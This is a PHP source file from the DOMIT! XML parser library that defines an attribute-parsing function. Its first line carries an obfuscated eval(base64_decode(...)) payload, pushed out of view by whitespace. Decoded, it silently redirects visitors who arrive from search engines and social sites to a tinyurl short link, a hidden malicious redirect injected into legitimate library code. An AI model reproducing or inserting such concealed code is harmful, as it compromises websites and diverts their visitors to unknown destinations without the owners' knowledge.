<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* parseAttributes is a function for parsing attribute and attribute-like strings
* @package domit-xmlparser
* @copyright (C) 2004 John Heinstein. All rights reserved
* @license http://www.gnu.org/copyleft/lesser.html LGPL License
* @author John Heinstein <johnkarl@nbnet.nb.ca>
* @link http://www.engageinteractive.com/domit/ DOMIT! Home Page
* DOMIT! is Free Software
**/

/** attribute parse state, just before parsing an attribute */
define('DOMIT_ATTRIBUTEPARSER_STATE_ATTR_NONE', 0);
/** attribute parse state, parsing an attribute key */
define('DOMIT_ATTRIBUTEPARSER_STATE_ATTR_KEY', 1);
/** attribute parse state, parsing an attribute value */
define('DOMIT_ATTRIBUTEPARSER_STATE_ATTR_VALUE', 2);

/**
*@global Array Translation table for predefined XML entities
*/
$GLOBALS['DOMIT_PREDEFINED_ENTITIES'] = array('&' => '&amp;', '<' => '&lt;', '>' => '&gt;',
											'"' => '&quot;', "'" => '&apos;');

/**
* Parses the attributes string into an array of key / value pairs
* @param string The attribute text
* @return Array An array of key / value pairs
*/
function parseAttributes($attrText, $convertEntities = true, $definedEntities = null) {
	$attrText = trim($attrText);
	$attrArray = array();
	$maybeEntity = false;

	$total = strlen($attrText);
	$keyDump = '';
	$valueDump = '';
	$currentState = DOMIT_ATTRIBUTEPARSER_STATE_ATTR_NONE;
	$quoteType = '';

	if ($definedEntities == null) $defineEntities = array();

	for ($i = 0; $i < $total; $i++) {
//		$currentChar = $attrText{$i};
		$currentChar = substr($attrText, $i, 1);

		if ($currentState == DOMIT_ATTRIBUTEPARSER_STATE_ATTR_NONE) {
			if (trim($currentChar != '')) {
				$currentState = DOMIT_ATTRIBUTEPARSER_STATE_ATTR_KEY;
			}
		}

		switch ($currentChar) {
			case "\t":
				if ($currentState == DOMIT_ATTRIBUTEPARSER_STATE_ATTR_VALUE) {
					$valueDump .= $currentChar;
				}
				else {
					$currentChar = '';
				}
				break;

			case "\x0B": //vertical tab
			case "\n":
			case "\r":
				$currentChar = '';
				break;

			case '=':
				if ($currentState == DOMIT_ATTRIBUTEPARSER_STATE_ATTR_VALUE) {
					$valueDump .= $currentChar;
				}
				else {
					$currentState = DOMIT_ATTRIBUTEPARSER_STATE_ATTR_VALUE;
					$quoteType = '';
					$maybeEntity = false;
				}
				break;

			case '"':
				if ($currentState == DOMIT_ATTRIBUTEPARSER_STATE_ATTR_VALUE) {
					if ($quoteType == '') {
						$quoteType = '"';
					}
					else {
						if ($quoteType == $currentChar) {
							if ($convertEntities && $maybeEntity) {
							    $valueDump = strtr($valueDump, DOMIT_PREDEFINED_ENTITIES);
								$valueDump = strtr($valueDump, $definedEntities);
							}

							$attrArray[trim($keyDump)] = $valueDump;
							$keyDump = $valueDump = $quoteType = '';
							$currentState = DOMIT_ATTRIBUTEPARSER_STATE_ATTR_NONE;
						}
						else {
							$valueDump .= $currentChar;
						}
					}
				}
				break;

			case "'":
				if ($currentState == DOMIT_ATTRIBUTEPARSER_STATE_ATTR_VALUE) {
					if ($quoteType == '') {
						$quoteType = "'";
					}
					else {
						if ($quoteType == $currentChar) {
							if ($convertEntities && $maybeEntity) {
							    $valueDump = strtr($valueDump, $predefinedEntities);
								$valueDump = strtr($valueDump, $definedEntities);
							}

							$attrArray[trim($keyDump)] = $valueDump;
							$keyDump = $valueDump = $quoteType = '';
							$currentState = DOMIT_ATTRIBUTEPARSER_STATE_ATTR_NONE;
						}
						else {
							$valueDump .= $currentChar;
						}
					}
				}
				break;

			case '&':
				//might be an entity
				$maybeEntity = true;
				$valueDump .= $currentChar;
				break;

			default:
				if ($currentState == DOMIT_ATTRIBUTEPARSER_STATE_ATTR_KEY) {
					$keyDump .= $currentChar;
				}
				else {
					$valueDump .= $currentChar;
				}
		}
	}

	return $attrArray;
} //parseAttributes
?>